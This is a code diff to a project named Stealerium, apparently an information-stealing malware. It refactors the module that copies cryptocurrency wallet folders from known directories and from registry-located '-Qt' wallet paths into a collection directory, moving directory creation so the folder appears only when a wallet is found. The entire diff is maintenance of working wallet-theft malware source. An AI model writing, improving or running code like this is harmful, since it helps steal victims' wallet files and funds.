@@ -54,8 +54,6 @@ namespace Stealerium.Target
         {
             try
             {
-                Directory.CreateDirectory(saveDir);
-
                 // Collect wallets from known directories
                 foreach (var wallet in KnownWalletDirectories)
                 {
@@ -68,8 +66,8 @@ namespace Stealerium.Target
                     CopyWalletFromRegistryTo(saveDir, wallet);
                 }
 
-                // If no wallets found, delete the save directory
-                if (Counter.Wallets == 0)
+                // If no wallets found, delete the save directory if it exists
+                if (Counter.Wallets == 0 && Directory.Exists(saveDir))
                 {
                     Filemanager.RecursiveDelete(saveDir);
                 }
@@ -85,6 +83,12 @@ namespace Stealerium.Target
         {
             if (!Directory.Exists(walletDir)) return;
 
+            // Create saveDir if it doesn't exist
+            if (!Directory.Exists(saveDir))
+            {
+                Directory.CreateDirectory(saveDir);
+            }
+
             var destinationDir = Path.Combine(saveDir, walletName);
             Filemanager.CopyDirectory(walletDir, destinationDir);
             Counter.Wallets++;
@@ -95,8 +99,6 @@ namespace Stealerium.Target
         // Copy wallet data from registry to the specified save directory
         private static void CopyWalletFromRegistryTo(string saveDir, string walletRegistry)
         {
-            var destinationDir = Path.Combine(saveDir, walletRegistry);
-
             try
             {
                 using (var registryKey = Registry.CurrentUser.OpenSubKey("Software")?.OpenSubKey(walletRegistry)?.OpenSubKey($"{walletRegistry}-Qt"))
@@ -107,6 +109,14 @@ namespace Stealerium.Target
                     if (string.IsNullOrEmpty(walletDir) || !Directory.Exists(walletDir)) return;
 
                     var sourceDir = Path.Combine(walletDir, "wallets");
+
+                    // Create saveDir if it doesn't exist
+                    if (!Directory.Exists(saveDir))
+                    {
+                        Directory.CreateDirectory(saveDir);
+                    }
+
+                    var destinationDir = Path.Combine(saveDir, walletRegistry);
                     Filemanager.CopyDirectory(sourceDir, destinationDir);
                     Counter.Wallets++;
 
